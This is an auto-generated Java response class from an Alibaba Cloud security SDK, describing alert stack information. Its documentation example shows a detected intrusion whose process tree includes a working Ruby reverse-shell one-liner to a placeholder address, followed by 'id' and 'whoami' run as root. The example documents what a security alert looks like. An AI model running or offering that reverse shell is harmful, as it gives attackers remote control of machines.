// This file is auto-generated, don't edit it. Thanks.
package com.aliyun.sas20181203.models;

import com.aliyun.tea.*;

public class DescribeAlarmEventStackInfoResponseBody extends TeaModel {
    /**
     * <p>The ID of the request.</p>
     * 
     * <strong>example:</strong>
     * <p>ECC6B3E3-D496-512D-B46D-E6996A6B63EE</p>
     */
    @NameInMap("RequestId")
    public String requestId;

    /**
     * <p>The stack information of the alert details.</p>
     * 
     * <strong>example:</strong>
     * <p>[ { &quot;child&quot;: [ { &quot;child&quot;: [ { &quot;child&quot;: [ ], &quot;data&quot;: { &quot;cmdline&quot;: &quot;id&quot;, &quot;proc_path&quot;: &quot;/bin/id&quot;, &quot;pid&quot;: &quot;[3033]&quot; }, &quot;description&quot;: { &quot;extend&quot;: [ ], &quot;main&quot;: { &quot;content&quot;: &quot;${pid} ${cmdline}&quot;, &quot;content_type&quot;: &quot;markdown&quot; } } }, { &quot;child&quot;: [ ], &quot;data&quot;: { &quot;cmdline&quot;: &quot;whoami&quot;, &quot;proc_path&quot;: &quot;/bin/whoami&quot;, &quot;pid&quot;: &quot;[3035]&quot; }, &quot;description&quot;: { &quot;extend&quot;: [ ], &quot;main&quot;: { &quot;content&quot;: &quot;${pid} ${cmdline}&quot;, &quot;content_type&quot;: &quot;markdown&quot; } } } ], &quot;data&quot;: { &quot;cmdline&quot;: &quot;/bin/bash -c \&quot;id &amp;&amp; whoami\&quot;&quot;, &quot;proc_path&quot;: &quot;/bin/bash&quot;, &quot;pid&quot;: &quot;[3022]&quot; }, &quot;description&quot;: { &quot;extend&quot;: [ ], &quot;main&quot;: { &quot;content&quot;: &quot;${pid} ${cmdline}&quot;, &quot;content_type&quot;: &quot;markdown&quot; } } } ], &quot;data&quot;: { &quot;src_ip&quot;: &quot;0.0.0.0&quot;, &quot;cmdline&quot;: &quot;ruby -rsocket -e exit if fork;c=TCPSocket.new(\\&quot;0.0.0.0\\&quot;,\\&quot;1111\\&quot;);while(cmd=c.gets);IO.popen(cmd,\\&quot;r\\&quot;){|io|c.print io.read}end&quot;, &quot;file&quot;: &quot;ruby&quot;, &quot;login_port&quot;: &quot;22&quot;, &quot;login_type&quot;: &quot;Password&quot;, &quot;proc_path&quot;: &quot;/usr/bin/ruby&quot;, &quot;dst_port&quot;: &quot;1111&quot;, &quot;pid&quot;: &quot;3011&quot;, &quot;user&quot;: &quot;root&quot;, &quot;dst_ip&quot;: &quot;0.0.0.0&quot;, &quot;log_time&quot;: &quot;2020-01-20 09:00:00&quot; }, &quot;description&quot;: { &quot;extend&quot;: [ { &quot;content&quot;: &quot;${tpl_netstat}&quot;, &quot;content_type&quot;: &quot;text&quot; } ], &quot;main&quot;: { &quot;content&quot;: &quot;${pid} ${cmdline}&quot;, &quot;content_type&quot;: &quot;markdown&quot; } } } ]</p>
     */
    @NameInMap("StackInfo")
    public String stackInfo;

    public static DescribeAlarmEventStackInfoResponseBody build(java.util.Map<String, ?> map) throws Exception {
        DescribeAlarmEventStackInfoResponseBody self = new DescribeAlarmEventStackInfoResponseBody();
        return TeaModel.build(map, self);
    }

    public DescribeAlarmEventStackInfoResponseBody setRequestId(String requestId) {
        this.requestId = requestId;
        return this;
    }
    public String getRequestId() {
        return this.requestId;
    }

    public DescribeAlarmEventStackInfoResponseBody setStackInfo(String stackInfo) {
        this.stackInfo = stackInfo;
        return this;
    }
    public String getStackInfo() {
        return this.stackInfo;
    }

}
